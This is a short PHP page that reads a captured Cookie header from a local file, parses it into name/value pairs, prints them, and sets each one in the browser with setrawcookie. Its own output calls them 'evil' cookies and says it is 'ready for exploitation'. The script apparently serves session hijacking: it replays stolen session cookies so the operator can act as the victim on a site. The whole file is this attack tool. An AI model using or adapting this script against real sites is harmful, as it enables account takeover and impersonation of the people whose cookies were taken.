<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title></title>
    </head>
    <body>
        <?php
        function inject($what)
        {
            for($i=0;$i<count($what);$i++)
            {
                $name = $what[$i][0];
                echo "injecting evil cookie named \"$name\" .... <br> ";
                setrawcookie($what[$i][0], $what[$i][1]);
            }
        echo 'all cookies injected properly, ready for exploitation';
        }
        
        $newcook=file("/home/todor/cook.txt");
        echo '<pre>';
        for ($i=0; $i<count($newcook); $i++)
            $newcook[$i] = str_replace('Cookie: ', '', $newcook[$i]);      
        $newcook = explode('; ', $newcook[0]);
        
        for($i=0;$i<count($newcook);$i++)
            $newcook[$i] = explode('=', $newcook[$i]);
        for($i=0;$i<count($newcook);$i++)
            echo 'cookie variable name "'.$newcook[$i][0].'" with value of "'.$newcook[$i][1].'"<br>';
        
        echo '</pre>';
        //clean_string($newcook);
        inject($newcook);
        ?>
    </body>
</html>
